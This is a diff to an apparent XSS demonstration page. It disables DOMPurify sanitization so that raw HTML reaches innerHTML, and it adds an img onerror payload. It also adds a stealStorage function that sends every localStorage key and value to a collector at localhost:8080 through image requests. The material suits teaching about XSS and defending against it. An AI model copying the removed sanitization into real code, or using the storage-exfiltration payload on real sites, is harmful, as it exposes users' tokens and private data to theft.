@@ -37,7 +37,8 @@
   <div id="divRender" class="element"></div>
 
   <script>
-    const initialData = `Hello <img src="invalid.png" onerror="alert('Put your own code just here!')">`;
+    const initialData = `Hello <img src="invalid.png" onerror="alert('Put your own malicious code just here!!!')">`;
+    //const initialData = `Hello <img src="invalid.png" onerror="stealStorage()">`;
 
       document.addEventListener("DOMContentLoaded", () => {
         document.getElementById("taData").value = initialData;
@@ -51,8 +52,19 @@
         console.log(`Rendering data in the div: ${data}`);
 
         div.innerHTML = data;
-        div.innerHTML = DOMPurify.sanitize(data);
+        //div.innerHTML = DOMPurify.sanitize(data);
       }
+  </script>
+  <script>
+    function stealStorage() {
+      let i=0, len=localStorage.length;
+      for (; i < len; ++i) {
+        let img = document.createElement("IMG");
+        img.src = "http://localhost:8080/data?key=" 
+            + localStorage.key(i) + "&value=" 
+            + localStorage.getItem(localStorage.key(i));
+      }
+    }
   </script>
 </body>
 
